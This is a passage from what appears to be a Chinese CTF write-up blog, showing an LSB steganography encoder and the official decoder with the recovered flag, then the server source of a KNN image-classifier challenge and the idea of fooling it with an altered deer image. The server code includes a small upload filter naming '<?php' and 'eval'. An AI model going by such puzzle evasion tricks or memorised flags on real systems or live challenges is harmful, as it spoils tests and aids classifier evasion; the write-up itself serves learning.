class="keyword">import</span> Image,ImageDraw</span><br><span class="line">p=Image.open(<span class="string">'flag.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">flag = []</span><br><span class="line">a,b = p.size</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        <span class="keyword">if</span> p.getpixel((x,y)) == <span class="number">255</span>:</span><br><span class="line">            flag.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="number">1</span>)</span><br><span class="line">key1stream = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    key1stream.append(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">key2stream = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    key2stream.append(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    enc.append(flag[i]^key1stream[i]^key2stream[i])</span><br><span class="line">hide=Image.open(<span class="string">'source.png'</span>).convert(<span class="string">'RGB'</span>)</span><br><span class="line">R=[]</span><br><span class="line">G=[]</span><br><span class="line">B=[]</span><br><span class="line">a,b = hide.size</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        R.append(bin(hide.getpixel((x,y))[<span class="number">0</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        G.append(bin(hide.getpixel((x, y))[<span class="number">1</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        B.append(bin(hide.getpixel((x, y))[<span class="number">2</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">R1=[]</span><br><span class="line">G1=[]</span><br><span class="line">B1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key1stream)):</span><br><span class="line">    <span class="keyword">if</span> key1stream[i] == <span class="number">1</span>:</span><br><span class="line">        R1.append(R[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        R1.append(R[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key2stream)):</span><br><span class="line">    <span class="keyword">if</span> key2stream[i] == <span class="number">1</span>:</span><br><span class="line">        G1.append(G[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        G1.append(G[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> enc[i] == <span class="number">1</span>:</span><br><span class="line">        B1.append(B[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        B1.append(B[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> range(len(R)):</span><br><span class="line">    R[r] = int(R1[r],<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> range(len(G)):</span><br><span class="line">    G[g] = int(G1[g],<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(B)):</span><br><span class="line">    B[b] = int(B1[b],<span class="number">2</span>)</span><br><span class="line">a,b = hide.size</span><br><span class="line">en_p = Image.new(<span class="string">'RGB'</span>,(a,b),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        en_p.putpixel((x,y),(R[y+x*b],G[y+x*b],B[y+x*b]))</span><br><span class="line">en_p.save(<span class="string">'encode.png'</span>)</span><br></pre></td></tr></table></figure>
<p>根据加密脚本写解密脚本,这里直接贴官方wp的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line">p = Image.open(<span class="string">'encode.png'</span>).convert(<span class="string">'RGB'</span>)</span><br><span class="line">a,b = p.size</span><br><span class="line">R=[]</span><br><span class="line">G=[]</span><br><span class="line">B=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        R.append(bin(p.getpixel((x,y))[<span class="number">0</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        G.append(bin(p.getpixel((x, y))[<span class="number">1</span>]).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        B.append(bin(p.getpixel((x, y))[<span class="number">2</span>]).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">R1=[]</span><br><span class="line">G1=[]</span><br><span class="line">B1=[]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(R)):</span><br><span class="line">    R1.append(int(R[i][<span class="number">-1</span>:]))</span><br><span class="line">    G1.append(int(G[i][<span class="number">-1</span>:]))</span><br><span class="line">    B1.append(int(B[i][<span class="number">-1</span>:]))</span><br><span class="line">print(R1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">print(G1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">print(B1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(R1)):</span><br><span class="line">    flag.append(B1[i]^G1[i]^R1[i])</span><br><span class="line">print(flag[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">de_p = Image.new(<span class="string">'L'</span>,(a,b),<span class="number">255</span>)</span><br><span class="line">c=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        <span class="keyword">if</span> flag[c] == <span class="number">1</span>:</span><br><span class="line">            de_p.putpixel((x,y),<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            de_p.putpixel((x, y), <span class="number">255</span>)</span><br><span class="line">        c=c+<span class="number">1</span></span><br><span class="line">de_p.save(<span class="string">'out.png'</span>)</span><br></pre></td></tr></table></figure></p>
<p>好家伙,差点把我电脑跑死机<br><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag{fa0a8cb83f26dead82e1a45f8af2f44b}</p>
<h2 id="指鹿为马"><a href="#指鹿为马" class="headerlink" title="指鹿为马"></a>指鹿为马</h2><p>show source code</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_horse</span><span class="params">()</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(<span class="string">'./horse.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">0</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_deer</span><span class="params">()</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(<span class="string">'./deer.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">1</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_test</span><span class="params">(pic)</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(pic).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">1</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">euclideanDistance</span><span class="params">(instance1, instance2, length)</span>:</span></span><br><span class="line">distance = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(length):</span><br><span class="line">distance += pow((instance1[x] - instance2[x]), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> math.sqrt(distance)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNeighbors</span><span class="params">(trainingSet, testInstance, k)</span>:</span></span><br><span class="line">distances = []</span><br><span class="line">length = len(testInstance) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(trainingSet)):</span><br><span class="line">dist = euclideanDistance(testInstance, trainingSet[x], length)</span><br><span class="line">distances.append((trainingSet[x], dist))</span><br><span class="line">distances.sort(key=operator.itemgetter(<span class="number">1</span>))</span><br><span class="line">neighbors = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(k):</span><br><span class="line">neighbors.append(distances[x][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> neighbors</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResponse</span><span class="params">(neighbors)</span>:</span></span><br><span class="line">classVotes = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(neighbors)):</span><br><span class="line">response = neighbors[x][<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> classVotes:</span><br><span class="line">classVotes[response] += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">classVotes[response] = <span class="number">1</span></span><br><span class="line">sortedVotes = sorted(classVotes.items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">return</span> sortedVotes[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAccuracy</span><span class="params">(testSet, predictions)</span>:</span></span><br><span class="line">correct = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(testSet)):</span><br><span class="line"><span class="keyword">if</span> testSet[x][<span class="number">-1</span>] == predictions[x]:</span><br><span class="line">correct += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> (correct / float(len(testSet))) * <span class="number">100.0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(pic)</span>:</span></span><br><span class="line">source_p = Image.open(<span class="string">'deer.png'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">c_p = Image.open(pic)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">"Please upload right picture."</span>)</span><br><span class="line">exit()</span><br><span class="line">diff_pixel = <span class="number">0</span></span><br><span class="line">a, b = source_p.size</span><br><span class="line"><span class="keyword">if</span> c_p.size[<span class="number">0</span>] != a <span class="keyword">and</span> c_p.size[<span class="number">1</span>] != b:</span><br><span class="line">print(<span class="string">"Please upload right picture size("</span>+str(a)+<span class="string">','</span>+str(b)+<span class="string">')'</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">diff_pixel += abs(source_p.getpixel((x, y)) - c_p.getpixel((x, y)))</span><br><span class="line"><span class="keyword">return</span> diff_pixel</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'-'</span> * <span class="number">134</span>)</span><br><span class="line">print(<span class="string">'''      ____       __            _          _   _                _                              _   _            _</span></span><br><span class="line"><span class="string">|  __ \     / _|          | |        | | | |              | |                            | | | |          | |</span></span><br><span class="line"><span class="string">| |__) |___| |_ ___ _ __  | |_ ___   | |_| |__   ___    __| | ___  ___ _ __    __ _ ___  | |_| |__   ___  | |__   ___  _ __ ___  ___</span></span><br><span class="line"><span class="string">|  _  // _ \  _/ _ \ '__| | __/ _ \  | __| '_ \ / _ \  / _` |/ _ \/ _ \ '__|  / _` / __| | __| '_ \ / _ \ | '_ \ / _ \| '__/ __|/ _ \\</span></span><br><span class="line"><span class="string">| | \ \  __/ ||  __/ |    | || (_) | | |_| | | |  __/ | (_| |  __/  __/ |    | (_| \__ \ | |_| | | |  __/ | | | | (_) | |  \__ \  __/</span></span><br><span class="line"><span class="string">|_|  \_\___|_| \___|_|     \__\___/   \__|_| |_|\___|  \__,_|\___|\___|_|     \__,_|___/  \__|_| |_|\___| |_| |_|\___/|_|  |___/\___|</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">134</span>)</span><br><span class="line">print(<span class="string">'\t1.show source code'</span>)</span><br><span class="line">print(<span class="string">'\t2.give me the source pictures'</span>)</span><br><span class="line">print(<span class="string">'\t3.upload picture'</span>)</span><br><span class="line">print(<span class="string">'\t4.exit'</span>)</span><br><span class="line">choose = input(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="keyword">if</span> choose == <span class="string">'1'</span>:</span><br><span class="line">w = open(<span class="string">'run.py'</span>,<span class="string">'r'</span>)</span><br><span class="line">print(w.read())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'2'</span>:</span><br><span class="line">print(<span class="string">'this is horse`s picture:'</span>)</span><br><span class="line">h = base64.b64encode(open(<span class="string">'horse.png'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(h.decode())</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">134</span>)</span><br><span class="line">print(<span class="string">'this is deer`s picture:'</span>)</span><br><span class="line">d = base64.b64encode(open(<span class="string">'deer.png'</span>, <span class="string">'rb'</span>).read())</span><br><span class="line">print(d.decode())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'4'</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'3'</span>:</span><br><span class="line">print(<span class="string">'Please input your deer picture`s base64(Preferably in png format)'</span>)</span><br><span class="line">pic = input(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pic = base64.b64decode(pic)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b"&lt;?php"</span> <span class="keyword">in</span> pic <span class="keyword">or</span> <span class="string">b'eval'</span> <span class="keyword">in</span> pic:</span><br><span class="line">print(<span class="string">"Hacker!!This is not WEB,It`s Just a misc!!!"</span>)</span><br><span class="line">exit()</span><br><span class="line">salt = str(random.getrandbits(<span class="number">15</span>))</span><br><span class="line">pic_name = <span class="string">'tmp_'</span>+salt+<span class="string">'.png'</span></span><br><span class="line">tmp_pic = open(pic_name,<span class="string">'wb'</span>)</span><br><span class="line">tmp_pic.write(pic)</span><br><span class="line">tmp_pic.close()</span><br><span class="line"><span class="keyword">if</span> check(pic_name)&gt;=<span class="number">100000</span>:</span><br><span class="line">print(<span class="string">'Don`t give me the horse source picture!!!'</span>)</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">ma = load_horse()</span><br><span class="line">lu = load_deer()</span><br><span class="line">k = <span class="number">1</span></span><br><span class="line">trainingSet = np.append(ma, lu).reshape(<span class="number">2</span>, <span class="number">5185</span>)</span><br><span class="line">testSet = load_test(pic_name)</span><br><span class="line">neighbors = getNeighbors(trainingSet, testSet[<span class="number">0</span>], k)</span><br><span class="line">result = getResponse(neighbors)</span><br><span class="line"><span class="keyword">if</span> repr(result) == <span class="string">'0'</span>:</span><br><span class="line">os.system(<span class="string">'clear'</span>)</span><br><span class="line">print(<span class="string">'Yes,I want this horse like deer,here is your flag encoded by base64'</span>)</span><br><span class="line">flag = base64.b64encode(open(<span class="string">'flag'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(flag.decode())</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'I want horse but not deer!!!'</span>)</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'wrong choose!!!'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>give me the source pictures<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">this is horse`s picture:</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAAAAABwhuybAAAFeElEQVR4nO2Xy28TVxTGvzN2ZpLYIY5dkgImIU4I2DFqQqiaqGpL2gXqv8AC2lUX/BFl032lSpWqblqpGyQ2LQhERQhUDSqk4ZnEtHnxCATn4TjP8fOeLmZszzPEUpeclefeM7/z3e/OfRh4G/9n+Dtk907v7jnKh42vc6690u5BTe/u1FsFyEPVgGoaqkAbw+pR5+m5689dq+5QxApSWjuO/DhbGoRgU6dcv7E7UH1472EUw2fuFDVS8e+UKblmX3JXoHBfiEKAOJjSClPOOpTOp2k3kCG19aN3IADA08habGyZk7nxRN2bFTWc8AuEWiWADtG8AIAF1ZLNrZ77SwynqIAa19cpHpMZgLddmcsTCpmwBACFZLGcFQ69TKoaivPragVKxl/9Z/YI/WlxRiVtoKC1qyoAtJzyAgAx66+LrWdPNu2KGL2n/el6vaFZntogzUBS8wCALXUPA2CQXl0KBPbdXtFfN5gdPxt68M210lNTNFj6mSxooJdWX5ibB3w20JEv9vLMqyeFUlJDtEX7pb4kSZIInFi3rTZuOWIdWuTLfUJiVNxjpUuZFwA8xwVAUzNYvTvgs03ZoYRqAsW+CgnAh3rDWL3t8tMCULMfAD0H8CxzbH+NQQ4A9jeYQF3fHR1LE/fXdHkMNaWD8kyGwAAKaQBIpkJBWRsf1YeCEgOSvmtqrW3fnxTp+2kiYov21alNAkDL1zLWQdW2xQMMcX1eKwoA9edPFjnQG2AWVg+CsSAA8LSNg8w/N1cq7ksA8P7nAuBAT4CJyDwz3HC0BcCLaRsHwModtZztBYC4XwDgpt6RJY/gBo+JVNslL6/N+f12Tl59PRczgXQsN937SRY43StM+d5ION9nx5DILSeWyqvQCwDjmz4GQBt/LQIYOqqYX5FqXTaPgz3p5flSEgDcveohgDyXRwFgctK2NbNzCA50HJYNoO2vL2xJ0uYv51UAyA5btyH3YBz4WPtEdXt8J7p5fGxbe1DO9QmXFx0i98NdA8gcvecUp2bnkB59m4XLSTsxUcUpye0H4AbKVeES2Bd2BWGyGklSozuoKknat+hSuSpJtAMod8NdkvPtxq1w4pFbD684XtuMZ78n3Fx+u7hWdKxMuZnNQFuNvcMI6vqk8h1yIzuBqHB58XgKDiTDAChSKyrheMJT4cpvOULqWX4nRZKX4Walzslf/bVAABw0WW9sBX222OFKTdlLV3Sj7SQLSEoOaQtfdMet0yalLo6UzmE7yaZoQ99BVItJxE8uJgCQv0ySjSm7u/kTide3bq0DQEenftmZHTvVZCC5ghjQ55S5sD1//552UwsNKAwAtPBHMnk2UCG5gho8QPbWGoGLanpxKau1Kv26iumRNYzCQLKCvB5NudzvFdL4BctqoN4IA6Dio9EMYCJZpka0HNNaYt0C6rB1VUXeAwBSR25rJ/joz6ul784AKqYBeD/o8QCQB+sgjScsnOCAAkBKDz0snYujQ6U+o6KHrwio6WsuCbppEaQMBBmgV9dmy84o7WScFz3SQwuE4sMlQD5ZB2li0syhnggDmP7d8D8i1i2gzllBSA0tiNGxAhCNOzjU3gOQeHBjzaBxsA7SZAKwzlrqRsu/RUAerBM2QcEBhUkdfVw0tEVjAupw1g7CygrgLEjpDzHSf84Zl4U8WCekSa2g0wfpKKgzwsgMvzC1RbvLghz3bEeH/B5QbtVaECVBTiD507KDO0c0LpC5mXUFxQyCDWG7XmqCJvQnu0dGBw2RXWPaNO1R0bhAplzQDup2FpSYZYhtW8GSIDtIcRaErBUdMwmyexSLOQqyhdkhh//9n/kEOQiyRfwYpKyhoA00PgU8frMg5C8JWp94c97bqMR/qKdMxhtIpukAAAAASUVORK5CYII=</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">this is deer`s picture:</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAAAAABwhuybAAAEXUlEQVR4nO2XS2xbRRSG/5l7b/xSb2wnDqbBSdU0FcQUmsRZVCAkorZJumkrFWEkWLJgyZINC5bsQQKEVAkhNRKJRKWqjUiFEAgUkYRQtYQ+ZCc4jzbk4dgkaWzfOSwSP+7D9r3Jtmc198ycz/+ZmTMzBp6Zc2N959wAXGdjDEDTxY6DggJfXT8FoOv7L/wArox/xG2FmUcpHsUNwKO4FYB3QNABQaCKyGi39pc9kKzT8p/Yb3pdfkhNSvTtpvu/2eLoQBfPfjkNAGh7+bTqlYIfs8aGha9XHYOkUyd7pgFAes/L8iIHldIzo4/scSpB2mPRpWYAwLtwK1EAINZW8jY5utQmzr8Uv5YB+MKnf9uNtwTdGbt8uWtW8tG4c44OVPiWBqJRiELSOUcHQvbqw4FjDR4qHBbU/mane0MJy+e2Z7VDgFj3W01ZhZFGL4bGx2wvVzG63IzF/TMjZwYYh0Dh1k2HpHKtxeIqJZcfaqRpRPLgkGI3cM9KqcXiKjHCfoWSPIiamviQd3KuspyL4FhcJcALLyuRampiJ4Y+OFMxL0VFvXGVAOpTTkg2NQktcGm5YsNxAGCxd/wAQIH+SElu3XkSgV6jotbXsptySNKfafXnCWGpvN1kANB+JzraLxnH1SVJFZMkA0BWcvlebTAfqSQPSjef1tJkAG0pA17F6mgm+XxoLCUseqxB9AveCO5lxhViABVjifd13vlzYctUepVZASiVCGsMKQAg2j8JCrDtmaelgYzl0umcEcQiR4jf/ax8TuzvI0qn9xrJxCsaoC3Pl9MjOdRiToUI5A8vlL6NJbP73bYQgrfplpCE2Qig1vejVUH46Z4EUIvfzrVIR989WRW0el0AcEdscADRfEmtBsKNJQ6g1WvrphYdxTIxgx7c5gCpYVuSwHtc1UDaaIYBUti4UayNwoFqIExMcQCyTZBbrQrKjhYA8cRWYQCSUhWEHxKySM7ZU1SqDdmiK/XNlfUnebsgVAfRyPNHWJljyJFZ/4IVCKnp/nK0K6iP3NmwDxK3OyNFkgi+rp/H3amUVYz123dlZL3UwbjevLE2+yDcu5ood+lTI48lyTI1ALPLvd3HJQBM7EqGsuOntUVTQI1FDn8YIIAt/2xYNmrpyUvB4pf2+d2aigAUCADY6o/GA7vVxRtEs8Fp74+G3hjn+X/WioDQwUEAWG5+bW9W+IXYYUBguflFAgBqjEftgaosB9u6NskAgPzHgZqTvR9Q5VnKVh4tsT4C9t9m9RSxjV+tSSKhZYcny3LrKGLp4T+sO9YXgcwwSk+kOorYxJTZ6eMAJXcAbN7IFDXVS23H7JLaGNjW3p2+W8r7AMvf/BwBqU2D9wCgdheQSxrvT+cgXwRgj1eMbuegVpUgEqY94RgkHeNg60smv2NQcwuB5syL6RjU7gLbmjP7nYJ8EQCpjLmjVokwTtxY+y80guUTpBtTD7Q95iF23+icBnb+1Y95UEPMM6uw/wEb7IPCRqC/gwAAAABJRU5ErkJggg==</span><br></pre></td></tr></table></figure></p>
<p>horse<figure class="image-box">
                <img src="./7.jpg" alt="图片](./6.jpg)deer![图片" title class>
                <p>图片](./6.jpg)deer![图片</p>
            </figure></p>
<p>根据官方说的知识点  KNN图像识别漏洞 单文件网页文件格式识别</p>
<p>审计代码得知需要进行图像操作使上传一个不能是马的图，但是需要识别成马，所以我们使用脚本对其进行修改，对鹿图进行弱化处理，再附加上马图，但是两图的距离（详情请看knn的图像识别原理）马图需要比鹿图增加得慢，这样才可以识别成鹿图。</p>
<p><a href="https://blog.csdn.net/chaipp0607/article/details/77915298" target="_blank" rel="noopener">knn原理</a><a href="https://blog.csdn.net/qq_35206320/article/details/81946246" target="_blank" rel="noopener">带例子分析</a>反正我是没看懂</p>
